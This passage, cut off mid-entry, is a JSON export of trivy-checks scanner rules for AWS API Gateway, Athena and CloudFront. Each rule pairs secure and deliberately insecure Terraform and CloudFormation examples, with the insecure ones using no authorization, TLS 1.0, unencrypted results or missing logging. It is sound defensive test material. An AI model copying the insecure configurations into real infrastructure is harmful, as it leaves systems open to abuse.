{
  "metadata": {
    "version": "1.0",
    "source": "trivy-checks",
    "last_updated": 1758707258.3618581,
    "total_rules": 269
  },
  "rules": {
    "terraform_aws": [
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_ACCESS_LOGGING",
        "title": "Enable Access Logging",
        "provider": "aws",
        "service": "apigateway",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good Example of ApiGateway\n\n      Resources:\n        GoodApi:\n          Type: AWS::ApiGatewayV2::Api\n\n        GoodApiStage:\n          Type: AWS::ApiGatewayV2::Stage\n          Properties:\n            AccessLogSettings:\n              DestinationArn: gateway-logging\n              Format: json\n            ApiId: !Ref GoodApi\n            StageName: GoodApiStage\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad Example of ApiGateway\n\n      Resources:\n        BadApi:\n          Type: AWS::ApiGatewayV2::Api\n\n        BadApiStage:\n          Type: AWS::ApiGatewayV2::Stage\n          Properties:\n            AccessLogSettings:\n              Format: json\n            ApiId: !Ref BadApi\n            StageName: BadApiStage\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings\n  good:\n    - |-\n      resource \"aws_apigatewayv2_stage\" \"good_example\" {\n        api_id = aws_apigatewayv2_api.example.id\n        name   = \"example-stage\"\n\n        access_log_settings {\n          destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n          format          = \"json\"\n        }\n      }\n    - |-\n      resource \"aws_api_gateway_stage\" \"good_example\" {\n        deployment_id = aws_api_gateway_deployment.example.id\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        stage_name    = \"example\"\n\n        access_log_settings {\n          destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n          format          = \"json\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n        api_id = aws_apigatewayv2_api.example.id\n        name   = \"example-stage\"\n      }\n    - |-\n      resource \"aws_api_gateway_stage\" \"bad_example\" {\n        deployment_id = aws_api_gateway_deployment.example.id\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        stage_name    = \"example\"\n      }\n",
        "file_name": "enable_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_access_logging.yaml",
        "local_path": "aws/apigateway/enable_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good Example of ApiGateway\n\nResources:\n  GoodApi:\n    Type: AWS::ApiGatewayV2::Api\n\n  GoodApiStage:\n    Type: AWS::ApiGatewayV2::Stage\n    Properties:\n      AccessLogSettings:\n        DestinationArn: gateway-logging\n        Format: json\n      ApiId: !Ref GoodApi\n      StageName: GoodApiStage"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad Example of ApiGateway\n\nResources:\n  BadApi:\n    Type: AWS::ApiGatewayV2::Api\n\n  BadApiStage:\n    Type: AWS::ApiGatewayV2::Stage\n    Properties:\n      AccessLogSettings:\n        Format: json\n      ApiId: !Ref BadApi\n      StageName: BadApiStage"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings"
            ],
            "good": [
              "resource \"aws_apigatewayv2_stage\" \"good_example\" {\n  api_id = aws_apigatewayv2_api.example.id\n  name   = \"example-stage\"\n\n  access_log_settings {\n    destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n    format          = \"json\"\n  }\n}",
              "resource \"aws_api_gateway_stage\" \"good_example\" {\n  deployment_id = aws_api_gateway_deployment.example.id\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  stage_name    = \"example\"\n\n  access_log_settings {\n    destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n    format          = \"json\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n  api_id = aws_apigatewayv2_api.example.id\n  name   = \"example-stage\"\n}",
              "resource \"aws_api_gateway_stage\" \"bad_example\" {\n  deployment_id = aws_api_gateway_deployment.example.id\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  stage_name    = \"example\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_CACHE",
        "title": "Enable Cache",
        "provider": "aws",
        "service": "apigateway",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_enabled\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"good_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled = false\n        }\n      }\n",
        "file_name": "enable_cache.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_cache.yaml",
        "local_path": "aws/apigateway/enable_cache.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_enabled"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"good_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"bad_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_CACHE_ENCRYPTION",
        "title": "Enable Cache Encryption",
        "provider": "aws",
        "service": "apigateway",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"good_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled      = true\n          cache_data_encrypted = true\n        }\n      }\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled      = false\n          cache_data_encrypted = false\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled      = true\n          cache_data_encrypted = false\n        }\n      }\n",
        "file_name": "enable_cache_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_cache_encryption.yaml",
        "local_path": "aws/apigateway/enable_cache_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"good_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = true\n    cache_data_encrypted = true\n  }\n}",
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"bad_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = false\n    cache_data_encrypted = false\n  }\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"bad_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = true\n    cache_data_encrypted = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_TRACING",
        "title": "Enable Tracing",
        "provider": "aws",
        "service": "apigateway",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"test\" {}\n\n      resource \"aws_api_gateway_stage\" \"good_example\" {\n        stage_name           = \"prod\"\n        rest_api_id          = aws_api_gateway_rest_api.test.id\n        deployment_id        = aws_api_gateway_deployment.test.id\n        xray_tracing_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"test\" {}\n\n      resource \"aws_api_gateway_stage\" \"bad_example\" {\n        stage_name           = \"prod\"\n        rest_api_id          = aws_api_gateway_rest_api.test.id\n        deployment_id        = aws_api_gateway_deployment.test.id\n        xray_tracing_enabled = false\n      }\n",
        "file_name": "enable_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_tracing.yaml",
        "local_path": "aws/apigateway/enable_tracing.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"test\" {}\n\nresource \"aws_api_gateway_stage\" \"good_example\" {\n  stage_name           = \"prod\"\n  rest_api_id          = aws_api_gateway_rest_api.test.id\n  deployment_id        = aws_api_gateway_deployment.test.id\n  xray_tracing_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"test\" {}\n\nresource \"aws_api_gateway_stage\" \"bad_example\" {\n  stage_name           = \"prod\"\n  rest_api_id          = aws_api_gateway_rest_api.test.id\n  deployment_id        = aws_api_gateway_deployment.test.id\n  xray_tracing_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "aws",
        "service": "apigateway",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_resource\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n      }\n\n      resource \"aws_api_gateway_method\" \"good_example\" {\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        resource_id   = aws_api_gateway_resource.example.id\n        http_method   = \"GET\"\n        authorization = \"AWS_IAM\"\n      }\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_resource\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method\" \"good_example\" {\n        rest_api_id      = aws_api_gateway_rest_api.example.id\n        resource_id      = aws_api_gateway_resource.example.id\n        http_method      = \"GET\"\n        authorization    = \"NONE\"\n        api_key_required = true\n      }\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_resource\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method\" \"good_example\" {\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        resource_id   = aws_api_gateway_resource.example.id\n        http_method   = \"OPTION\"\n        authorization = \"NONE\"\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {}\n\n      resource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n        rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n      }\n\n      resource \"aws_api_gateway_method\" \"bad_example\" {\n        rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n        resource_id   = aws_api_gateway_resource.MyDemoResource.id\n        http_method   = \"GET\"\n        authorization = \"NONE\"\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/no_public_access.yaml",
        "local_path": "aws/apigateway/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_resource\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n}\n\nresource \"aws_api_gateway_method\" \"good_example\" {\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  resource_id   = aws_api_gateway_resource.example.id\n  http_method   = \"GET\"\n  authorization = \"AWS_IAM\"\n}",
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_resource\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method\" \"good_example\" {\n  rest_api_id      = aws_api_gateway_rest_api.example.id\n  resource_id      = aws_api_gateway_resource.example.id\n  http_method      = \"GET\"\n  authorization    = \"NONE\"\n  api_key_required = true\n}",
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_resource\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method\" \"good_example\" {\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  resource_id   = aws_api_gateway_resource.example.id\n  http_method   = \"OPTION\"\n  authorization = \"NONE\"\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {}\n\nresource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n  rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n}\n\nresource \"aws_api_gateway_method\" \"bad_example\" {\n  rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n  resource_id   = aws_api_gateway_resource.MyDemoResource.id\n  http_method   = \"GET\"\n  authorization = \"NONE\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "apigateway",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy\n  good:\n    - |-\n      resource \"aws_api_gateway_domain_name\" \"good_example\" {\n        security_policy = \"TLS_1_2\"\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_domain_name\" \"bad_example\" {\n        security_policy = \"TLS_1_0\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/use_secure_tls_policy.yaml",
        "local_path": "aws/apigateway/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy"
            ],
            "good": [
              "resource \"aws_api_gateway_domain_name\" \"good_example\" {\n  security_policy = \"TLS_1_2\"\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_domain_name\" \"bad_example\" {\n  security_policy = \"TLS_1_0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ATHENA-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "athena",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: goodExample\n            WorkGroupConfiguration:\n              ResultConfiguration:\n                EncryptionConfiguration:\n                  EncryptionOption: SSE_KMS\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: badExample\n            WorkGroupConfiguration:\n              ResultConfiguration: null\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration\n  good:\n    - |-\n      resource \"aws_athena_database\" \"good_example\" {\n        name   = \"database_name\"\n        bucket = aws_s3_bucket.hoge.bucket\n\n        encryption_configuration {\n          encryption_option = \"SSE_KMS\"\n          kms_key_arn       = aws_kms_key.example.arn\n        }\n      }\n    - |-\n      resource \"aws_athena_workgroup\" \"good_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = true\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n            encryption_configuration {\n              encryption_option = \"SSE_KMS\"\n              kms_key_arn       = aws_kms_key.example.arn\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_athena_database\" \"bad_example\" {\n        name   = \"database_name\"\n        bucket = aws_s3_bucket.hoge.bucket\n      }\n    - |-\n      resource \"aws_athena_workgroup\" \"bad_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = true\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n          }\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/athena/enable_at_rest_encryption.yaml",
        "local_path": "aws/athena/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: goodExample\n      WorkGroupConfiguration:\n        ResultConfiguration:\n          EncryptionConfiguration:\n            EncryptionOption: SSE_KMS"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: badExample\n      WorkGroupConfiguration:\n        ResultConfiguration: null"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration"
            ],
            "good": [
              "resource \"aws_athena_database\" \"good_example\" {\n  name   = \"database_name\"\n  bucket = aws_s3_bucket.hoge.bucket\n\n  encryption_configuration {\n    encryption_option = \"SSE_KMS\"\n    kms_key_arn       = aws_kms_key.example.arn\n  }\n}",
              "resource \"aws_athena_workgroup\" \"good_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_athena_database\" \"bad_example\" {\n  name   = \"database_name\"\n  bucket = aws_s3_bucket.hoge.bucket\n}",
              "resource \"aws_athena_workgroup\" \"bad_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ATHENA-NO_ENCRYPTION_OVERRIDE",
        "title": "No Encryption Override",
        "provider": "aws",
        "service": "athena",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: goodExample\n            WorkGroupConfiguration:\n              EnforceWorkGroupConfiguration: true\n              ResultConfiguration:\n                EncryptionConfiguration:\n                  EncryptionOption: SSE_KMS\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: badExample\n            WorkGroupConfiguration:\n              EnforceWorkGroupConfiguration: false\n              ResultConfiguration:\n                EncryptionConfiguration:\n                  EncryptionOption: SSE_KMS\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration\n  good:\n    - |-\n      resource \"aws_athena_workgroup\" \"good_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = true\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n            encryption_configuration {\n              encryption_option = \"SSE_KMS\"\n              kms_key_arn       = aws_kms_key.example.arn\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_athena_workgroup\" \"bad_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = false\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n            encryption_configuration {\n              encryption_option = \"SSE_KMS\"\n              kms_key_arn       = aws_kms_key.example.arn\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_athena_workgroup\" \"bad_example\" {\n        name = \"example\"\n\n      }\n",
        "file_name": "no_encryption_override.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/athena/no_encryption_override.yaml",
        "local_path": "aws/athena/no_encryption_override.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: goodExample\n      WorkGroupConfiguration:\n        EnforceWorkGroupConfiguration: true\n        ResultConfiguration:\n          EncryptionConfiguration:\n            EncryptionOption: SSE_KMS"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: badExample\n      WorkGroupConfiguration:\n        EnforceWorkGroupConfiguration: false\n        ResultConfiguration:\n          EncryptionConfiguration:\n            EncryptionOption: SSE_KMS"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration"
            ],
            "good": [
              "resource \"aws_athena_workgroup\" \"good_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_athena_workgroup\" \"bad_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = false\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}",
              "resource \"aws_athena_workgroup\" \"bad_example\" {\n  name = \"example\"\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-ENABLE_LOGGING",
        "title": "Enable Logging",
        "provider": "aws",
        "service": "cloudfront",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        // other config\n        logging_config {\n          include_cookies = false\n          bucket          = \"mylogs.s3.amazonaws.com\"\n          prefix          = \"myprefix\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        // other config\n        // no logging_config\n      }\n",
        "file_name": "enable_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/enable_logging.yaml",
        "local_path": "aws/cloudfront/enable_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  // other config\n  logging_config {\n    include_cookies = false\n    bucket          = \"mylogs.s3.amazonaws.com\"\n    prefix          = \"myprefix\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  // other config\n  // no logging_config\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-ENABLE_WAF",
        "title": "Enable Waf",
        "provider": "aws",
        "service": "cloudfront",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              WebACLId: waf_id\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n\n        origin {\n          domain_name = 